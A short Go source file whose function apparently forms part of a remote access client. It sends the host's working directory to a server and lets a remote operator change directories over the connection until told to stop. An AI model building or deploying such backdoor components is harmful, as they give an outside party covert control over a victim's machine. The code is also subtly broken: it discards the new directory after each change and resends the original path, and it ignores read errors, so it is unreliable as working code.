package filenavigation

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

// send the present location to the server
func NavigateSystem(conn net.Conn) (err error) {

	pwd, err := os.Getwd()

	if err != nil {
		fmt.Println("[-] Can't get present directory")
	}

	fmt.Println(pwd)

	pwd_raw := pwd + "\n"

	nbyte, err := conn.Write([]byte(pwd_raw))

	fmt.Println("[+] ", nbyte, " was written")

	CommandReader := bufio.NewReader(conn)

	looper := true

	for looper {
		userCommandRaw, err := CommandReader.ReadString('\n')

		if err != nil {
			fmt.Println("[+] Unable to read command ")
		}

		if userCommandRaw == "stop\n" {
			looper = false
			break
		}

		userCommand := strings.TrimSuffix(userCommandRaw, "\n")

		userCommandArr := strings.Split(userCommand, " ")

		if len(userCommandArr) > 1 {
			dir2move := userCommandArr[1]
			err = os.Chdir(dir2move)
			if err != nil {
				fmt.Println("[-] Unable to change directory")
			}
		}

		_, _ = os.Getwd()

		_, _ = conn.Write([]byte(pwd + "\n"))

	}
	return
}
